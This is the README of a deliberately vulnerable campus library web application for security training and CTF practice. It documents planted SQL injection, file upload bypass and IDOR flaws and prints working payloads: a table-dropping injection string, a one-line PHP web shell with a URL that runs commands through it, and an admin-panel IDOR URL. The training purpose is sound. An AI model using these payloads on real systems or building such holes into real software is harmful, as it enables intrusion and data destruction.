# Vulnerable Campus Library Application

A deliberately vulnerable web application designed for security testing and educational purposes. This application simulates a campus library management system with multiple security vulnerabilities.

⚠️ **WARNING: This application is intentionally vulnerable. DO NOT deploy in production environments!**

## Features

- **User Interface**: Browse books, post reviews, manage member accounts
- **Admin Interface**: Manage books and library members
- **Authentication System**: Login/logout functionality with role-based access

## Vulnerabilities

This application includes three main vulnerabilities for educational purposes:

### 1. SQL Injection
- **Location**: Comment/review section on homepage
- **Impact**: Database content disclosure, authentication bypass, data manipulation
- **Severity**: Critical

### 2. Unrestricted File Upload
- **Location**: User profile avatar upload
- **Technique**: Double extension bypass (e.g., `shell.php.jpg`)
- **Impact**: Remote Code Execution (RCE)
- **Severity**: Critical

### 3. Insecure Direct Object Reference (IDOR)
- **Location**: User profile page with special parameter
- **Impact**: Unauthorized access to admin panel
- **Severity**: High

## Installation

### Requirements
- Ubuntu 24.04 LTS
- Public IP address
- Root or sudo access

### Quick Setup

1. **Download and run the setup script:**
```bash
wget https://github.com/pondoksiber/Vuln_Campus_Library.git
chmod +x setup.sh
sudo ./setup.sh
```

2. **Start the service:**
```bash
sudo library-start
```

3. **Access the application:**
```
http://YOUR_SERVER_IP
```

### Manual Installation

If you prefer manual setup:

```bash
# Install dependencies
sudo apt update
sudo apt install -y nginx mysql-server php8.3-fpm php8.3-mysql php8.3-gd

# Clone the repository
git clone https://github.com/pondoksiber/Vuln_Campus_Library.git
cd vulnerable-library

# Run setup script
sudo ./setup.sh
```

## Usage

### Starting/Stopping the Service

**Start:**
```bash
sudo library-start
```

**Stop:**
```bash
sudo library-stop
```

### Test Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Admin |
| john_doe | password123 | User |
| jane_smith | password123 | User |

## Testing the Vulnerabilities

### SQL Injection
1. Login as any user
2. Navigate to homepage
3. In the comment box of any book, try:
   ```sql
   test'); DROP TABLE users; --
   ```

### File Upload Bypass
1. Login as any user
2. Go to your profile page
3. Upload a file named `shell.php.jpg` containing:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Access: `http://YOUR_IP/uploads/shell.php?cmd=whoami`

### IDOR to Admin Panel
1. Login as regular user
2. Visit: `http://YOUR_IP/user.php?id=1&panel=admin`

## Database Management

### Reset Database
```bash
sudo mysql -u root library_db < reset_db.sql
```

### Remove Malicious Users
```bash
sudo mysql -u root library_db -e "DELETE FROM users WHERE username='hacker';"
```

### Reset User Roles
```bash
sudo mysql -u root library_db -e "UPDATE users SET role='user' WHERE username='john_doe';"
```

## Security Notice

This application is designed for:
- Security training and education
- Penetration testing practice
- Web vulnerability demonstrations
- CTF challenges

**DO NOT:**
- Deploy on public-facing servers
- Use in production environments
- Test on systems without authorization

## Educational Purpose

This project helps security professionals and students understand:
- How SQL injection vulnerabilities work
- File upload security risks
- Access control vulnerabilities
- The importance of secure coding practices

## Troubleshooting

### Common Issues

1. **500 Internal Server Error**
   - Check nginx error logs: `sudo tail -f /var/log/nginx/error.log`
   - Verify PHP-FPM is running: `sudo systemctl status php8.3-fpm`

2. **Cannot Access Application**
   - Check firewall: `sudo ufw allow 80/tcp`
   - Verify nginx is running: `sudo systemctl status nginx`

3. **MySQL Connection Failed**
   - Check MySQL status: `sudo systemctl status mysql`
   - Verify database exists: `sudo mysql -e "SHOW DATABASES;"`

## Contributing

Feel free to submit issues and enhancement requests!

## Disclaimer

This application contains serious security vulnerabilities by design. The authors assume no liability for any misuse or damage caused by this application. Use responsibly and only in authorized environments.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

- Created for educational purposes
- Inspired by OWASP WebGoat and similar projects
- Thanks to the security community for promoting secure coding practices

---

**Remember**: The best way to understand security vulnerabilities is to see them in action in a safe, controlled environment. Always practice responsible disclosure and ethical hacking!
